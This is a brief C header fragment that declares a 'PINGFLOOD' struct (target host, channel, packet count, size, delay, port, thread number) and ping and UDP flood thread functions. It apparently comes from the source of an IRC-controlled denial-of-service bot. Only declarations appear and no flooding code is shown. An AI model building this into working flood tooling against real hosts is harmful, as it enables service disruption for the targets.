/*****************************************************************************/
/*                                Morgan Copy Right 2005 
/*****************************************************************************/  
#if !defined NO_PING && !defined NO_UDP
 // ping/udp structure.
typedef struct PINGFLOOD 
{
	SOCKET sock;
	char chan[128];
	char host[128];
	int num;
	int size;
	int delay;
	int port;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} PINGFLOOD;
#endif

#ifndef NO_PING
DWORD WINAPI ping(LPVOID param);
#endif

#ifndef NO_UDP
DWORD WINAPI udp(LPVOID param);
#endif

